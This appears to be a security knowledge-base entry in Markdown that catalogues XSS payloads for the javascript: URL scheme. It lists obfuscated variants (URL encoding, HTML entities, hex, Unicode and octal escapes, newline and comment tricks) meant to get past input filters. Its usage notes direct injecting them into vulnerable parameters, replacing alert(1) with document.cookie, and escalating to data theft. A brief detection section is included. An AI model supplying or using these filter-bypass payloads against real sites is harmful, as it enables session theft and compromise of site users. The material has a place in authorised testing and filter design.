---
type: code
language: javascript
verified: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Web
  - Browser
tags:
  - xss
  - javascript
  - injection
validated: true
---

# javascript-xss-injection-techniques

## Code

```javascript
javascript:prompt(1)

%26%23106%26%2397%26%23118%26%2397%26%23115%26%2399%26%23114%26%23105%26%23112%26%23116%26%2358%26%2399%26%23111%26%23110%26%23102%26%23105%26%23114%26%23109%26%2340%26%2349%26%2341

&#106&#97&#118&#97&#115&#99&#114&#105&#112&#116&#58&#99&#111&#110&#102&#105&#114&#109&#40&#49&#41

We can encode the "javascript:" in Hex/Octal
\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3aalert(1)
\u006A\u0061\u0076\u0061\u0073\x63\u0072\u0069\u0070\u0074\x003aalert(1)
\152\141\166\141\163\143\162\151\160\164\072alert(1)

We can use a 'newline character'
java%0ascript:alert(1)   - LF (\n)
java%09script:alert(1)   - Horizontal tab (\t)
java%0dscript:alert(1)   - CR (\r)

Using the escape character
\j\av\a\s\cr\i\pt\:\a\l\ert\(1\)

Using the newline and a comment //
javascript://%0Aalert(1)
javascript://anything%0D%0A%0D%0Awindow.alert(1)
```

## Description

This code snippet provides multiple encoded variants of JavaScript protocol injections for XSS, including URL encoding, HTML entities, hex/Unicode escapes, newlines, and comments. It demonstrates bypassing filters that block plain 'javascript:alert(1)' by obfuscating the protocol handler.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| N/A | No variables; payloads are static but can be customized (e.g., replace alert(1) with document.cookie) | alert(document.cookie) |

## Usage

Inject these payloads into vulnerable parameters (e.g., href, src, or reflected inputs) using a proxy like Burp Suite. Test in a browser; execution triggers a prompt or alert. Used in red team engagements to confirm XSS and escalate to data theft.

## Detection

- WAF rules matching encoded javascript: patterns or suspicious protocols.
- Browser CSP violations logging inline script attempts.
- Client-side monitoring for unexpected prompts/alerts or network requests to attacker domains.

## Related

- [[procedures/xss-injection-via-javascript-data-uri-vbscript]]
